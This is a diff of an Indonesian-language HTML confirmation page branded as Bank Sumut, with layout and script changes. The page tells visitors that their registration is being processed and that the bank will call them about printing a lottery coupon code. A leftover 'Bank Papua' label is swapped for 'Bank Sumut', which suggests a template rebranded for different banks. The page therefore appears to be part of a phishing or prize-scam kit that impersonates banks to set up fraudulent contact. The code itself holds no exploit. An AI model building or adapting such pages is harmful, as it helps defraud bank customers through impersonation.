@@ -11,29 +11,45 @@
   <!-- SweetAlert2 -->
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
   <style>
-    /* Latar belakang halaman */
     body {
       font-family: "Poppins", sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
       margin: 0;
+      /* Atur agar halaman full-height tanpa align center supaya content bisa memenuhi layar */
+      min-height: 100vh;
     }
 
-    /* Gambar di atas */
+    /* Navbar Full Width & Fixed, background diubah jadi transparan */
+    nav {
+      width: 100%;
+      padding: 0;
+      position: fixed;
+      top: 0;
+      z-index: 10;
+      background: transparent;
+    }
+
+    nav img {
+      width: 100%;      /* Buat gambar navbar memenuhi lebar layar */
+      height: auto;
+      object-fit: cover; /* Cover area */
+      display: block;
+    }
+
+    .content {
+      margin-top: 60px;  /* Sesuaikan margin agar tidak tertutup navbar */
+      text-align: center;
+    }
+
     .img-fluid {
-      margin: 0 auto; /* Tengah */
-      border-top-right-radius: 150px; /* Border kanan atas */
-      border-bottom-right-radius: 150px; /* Border kanan bawah */
+      margin: 0 auto;
+      border-top-right-radius: 150px;
+      border-bottom-right-radius: 150px;
       max-height: 300px;
       object-fit: cover;
-      object-position: top center; /* Gambar lebih ke atas */
-      width: 100%; /* Full width */
+      object-position: top center;
+      width: 100%;
     }
 
-    /* Container utama */
     .container {
       background: #fff;
       border-radius: 12px;
@@ -42,9 +58,9 @@
       width: 100%;
       text-align: center;
       padding: 20px;
+      margin: 20px auto;
     }
 
-    /* Kotak pesan dengan background tinggi, teks muncul satu per satu */
     .message {
       background: linear-gradient(135deg, #4c86c0, #0059b3);
       color: #fff;
@@ -53,18 +69,9 @@
       font-size: 16px;
       font-weight: 600;
       margin-bottom: 20px;
-      position: relative;
-      min-height: 120px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    /* Area tempat teks diketik satu per satu */
-    .typingText {
-      white-space: pre-line; /* Multiline */
-      text-align: center;
+      /* Buat text area mengisi penuh container */
       width: 100%;
+      box-sizing: border-box;
     }
 
     .footer {
@@ -72,66 +79,43 @@
       color: #777;
       margin-top: 10px;
     }
-
-    /* Custom styling untuk SweetAlert2 pop-up */
-    .swal2-border-radius {
-      border-radius: 12px !important;
-    }
-
-    .swal2-image-custom {
-      margin-bottom: -10px;
-      width: 130px;
-    }
-
-    .swal2-text-custom {
-      width: 20px;
-    }
   </style>
 </head>
 <body onload="initPage()">
 
-  <!-- Gambar paling atas -->
-  <img src="yoowe.jpg" alt="Ilustrasi Pelanggan" class="img-fluid" />
+  <!-- Navbar dengan gambar full width -->
+  <nav>
+    <img src="navbar1.png" alt="Logo Bank Sumut" />
+  </nav>
 
-  <div class="container">
-    <!-- Kotak pesan dengan efek ketik (typewriter) -->
-    <div class="message">
-      <div id="typingContainer" class="typingText"></div>
-    </div>
+  <div class="content">
+    <img src="yoowe.jpg" alt="Ilustrasi Pelanggan" class="img-fluid" />
 
-    <div class="footer">
-      &copy; 2025 BANK SUMUT
+    <div class="container">
+      <div class="message">
+        <div id="typingContainer"></div>
+      </div>
+      <div class="footer">&copy; 2025 BANK SUMUT</div>
     </div>
   </div>
 
   <audio id="thankYouAudio" src="speech.mp3"></audio>
   <script>
     const typewriterText = `Terimakasih Telah Mendaftar di Layanan Bank Sumut.
-Pendaftaran Anda Sedang Diproses.
-Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank Sumut
-Untuk Proses Cetak Kode Kupon Undian Anda.`;
-
+  Pendaftaran Anda Sedang Diproses.
+  Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank Sumut
+  Untuk Proses Cetak Kode Kupon Undian Anda.`;
+    
     function playAudio() {
       const audio = document.getElementById("thankYouAudio");
-      const playPromise = audio.play();
-      if (playPromise !== undefined) {
-        playPromise.catch((error) => {
-          document.body.addEventListener(
-            "click",
-            () => {
-              audio.play();
-            },
-            { once: true }
-          );
-        });
-      }
+      audio.play();
     }
-
+    
     function typeWriterEffect(text, containerId, speed = 40) {
       let index = 0;
       const container = document.getElementById(containerId);
       container.innerHTML = "";
-
+    
       function typeChar() {
         if (index < text.length) {
           container.innerHTML += text.charAt(index);
@@ -141,20 +125,15 @@ Untuk Proses Cetak Kode Kupon Undian Anda.`;
       }
       typeChar();
     }
-
+    
     function showThankYouAlert() {
       Swal.fire({
         width: '320px',
         imageUrl: "icon.png",
         text: "Lanjut proses Penyelesaian.",
-        imageAlt: "Bank Papua",
+        imageAlt: "Bank Sumut",
         confirmButtonText: "OK",
         confirmButtonColor: "#004080",
-        customClass: {
-          text: "swal2-text-custom",
-          popup: "swal2-border-radius",
-          image: "swal2-image-custom",
-        },
       }).then((result) => {
         if (result.isConfirmed) {
           playAudio();
@@ -162,7 +141,7 @@ Untuk Proses Cetak Kode Kupon Undian Anda.`;
         }
       });
     }
-
+    
     function initPage() {
       showThankYouAlert();
     }
